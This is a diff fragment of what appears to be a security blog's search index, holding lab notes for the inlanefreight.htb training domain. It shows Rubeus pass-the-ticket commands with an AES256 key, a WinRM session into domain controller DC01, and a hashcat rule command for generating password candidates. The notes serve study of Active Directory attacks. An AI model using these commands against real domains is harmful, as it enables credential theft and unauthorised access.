-<h4 id="Connect-winrm"><a href="#Connect-winrm" class="headerlink" title="Connect winrm"></a>Connect winrm</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt;powershell</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\tools&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; whoami</span><br><span class="line">inlanefreight\john</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; hostname</span><br><span class="line">DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Rubeus-3"><a href="#Rubeus-3" class="headerlink" title="Rubeus"></a>Rubeus</h2><h4 id="Create-a-sacrificial-process"><a href="#Create-a-sacrificial-process" class="headerlink" title="Create a sacrificial process"></a>Create a sacrificial process</h4><p><code>➜ The command will open a new cmd window</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe createnetonly /program:<span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span> /show</span><br></pre></td></tr></table></figure>
-<h4 id="Import-Ticket-1"><a href="#Import-Ticket-1" class="headerlink" title="Import Ticket"></a>Import Ticket</h4><p><code>➜ From that window, we can execute Rubeus to request a new TGT.</code></p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<span class="number">9279</span>bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt</span><br></pre></td></tr></table></figure>
-
-<h4 id="Connect-winrm-1"><a href="#Connect-winrm-1" class="headerlink" title="Connect winrm"></a>Connect winrm</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tools&gt;powershell</span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) <span class="number">2015</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\tools&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> DC01</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; whoami</span><br><span class="line">inlanefreight\john</span><br><span class="line">[<span class="type">DC01</span>]: <span class="built_in">PS</span> C:\Users\john\Documents&gt; hostname</span><br><span class="line">DC01</span><br></pre></td></tr></table></figure>]]></content>
+<h3 id="Applying-Hashcat-Rules-to-a-Wordlist"><a href="#Applying-Hashcat-Rules-to-a-Wordlist" class="headerlink" title="Applying Hashcat Rules to a Wordlist"></a>Applying Hashcat Rules to a Wordlist</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat --force our-wordlist -r custom.rule --stdout | <span class="built_in">sort</span> -u &gt; mut_password.list</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Post-Exploitation</category>
-        <category>Pass the Hash (PtH)</category>
+        <category>Enumeration</category>
+        <category>Users &amp; Passwords Enumeration</category>
+        <category>Writing Custom Wordlists and Rules</category>
       </categories>
       <tags>
-        <tag>mimikatz</tag>
-        <tag>Invoke-TheHash</tag>
+        <tag>Creds</tag>
+        <tag>CeWL</tag>
+        <tag>Cupp</tag>
+        <tag>Hashcat Rules</tag>
       </tags>
   </entry>
 </search>
